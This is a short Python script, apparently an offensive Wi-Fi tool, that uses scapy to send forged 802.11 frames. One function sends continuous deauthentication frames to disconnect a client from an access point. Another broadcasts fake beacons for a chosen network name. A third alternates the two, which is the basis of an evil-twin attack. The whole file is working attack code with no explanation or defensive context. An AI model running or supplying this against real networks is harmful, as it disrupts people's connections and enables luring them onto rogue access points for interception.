from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt
import time


def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
    packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
        Dot11Deauth(reason=reason)
    print(f'SENDING DEAUTH to {BSSID}')

    sendp(packet, iface=iface, loop=1, inter=0.01)


def beacon(iface: str, BSSID: str, client: str, SSID: str, timeout: int = 20, reason: int = 7):
    packet = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=BSSID, addr3=BSSID) / \
        Dot11Beacon() / \
        Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
    print(f'SENDING BEACON for {BSSID}')

    sendp(packet, iface=iface, loop=1, inter=0.1)


def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: str, beacon_BSSID: str, reason: int = 7, timeout: int = 20):

    deauth_packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=deauth_client, addr2=deauth_BSSID, addr3=deauth_BSSID) / \
        Dot11Deauth(reason=reason)

    beacon_packet = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=beacon_BSSID, addr3=beacon_BSSID) / \
        Dot11Beacon() / \
        Dot11Elt(ID='SSID', info=SSID, len=len(SSID))

    for i in range(timeout * 10):
        sendp(deauth_packet, iface=iface, count=1)
        print(f'SENDING DEAUTH to {deauth_BSSID}')
        sendp(beacon_packet, iface=iface, count=1)
        print(f'SENDING BEACON for {beacon_BSSID}')
        time.sleep(0.5)
